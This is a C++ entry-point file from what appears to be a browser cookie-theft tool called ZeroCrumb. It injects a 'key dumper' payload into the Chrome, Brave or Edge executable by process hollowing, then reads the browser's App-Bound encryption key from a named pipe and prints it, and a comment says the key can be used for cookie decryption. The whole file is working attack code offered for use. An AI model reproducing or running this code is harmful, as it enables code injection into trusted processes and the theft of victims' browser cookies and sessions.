#include "./src/comm/comm.h"
#include "./src/hollowing/hollowing.h"
#include "./src/config/config.h"

#include <iostream>
#include<windows.h>

#include <fstream>
#include <sstream>
#include <iomanip>

using std::ostringstream;
using std::string;

using std::setw;
using std::hex;
using std::setfill;

string KeyBytesToHexString(const BYTE* byteArray) {
    ostringstream oss;
    for (size_t i = 0; i < comm::keySize; ++i) {
        oss << hex << setw(2) << setfill('0') << static_cast<int>(byteArray[i]);
    }
    return oss.str();
}
int main(int argc, char* argv[])
{

    // 0 = chrome, 1 = brave, 2 = edge
    DWORD browserType = atoi(argv[1]);

    BrowserPathConfig browserConfig;

    switch (browserType) {
    case BrowserType::Chrome:
        browserConfig = config::chrome;
        break;

    case BrowserType::Brave:
        browserConfig = config::brave;
        break;

    case BrowserType::Edge:
        browserConfig = config::edge;
        break;
    }
    

    SIZE_T payloadSize;
    PBYTE payload = hollowing::getPayloadBuffer(config::keyDumperPath.c_str(), payloadSize);
    hollowing::hollow(browserConfig.exePath.c_str(), payload, payloadSize);

    printf("[*] Reading ABK From ZeroCrumb Named Pipe...\n");

    Sleep(250);

    HANDLE pipe = comm::connectToPipe();
    PBYTE key = comm::readAppBoundKey(pipe);

    if (!key) {
        printf("[-] Failed To Read Key From Zero Crumb Named Pipe.\n");
    }
    else {
        string strKey = KeyBytesToHexString(key);
        printf("[+] App Bound Key: %s\n", strKey.c_str()); // now you can use this in your cookie decryption code
    }
}
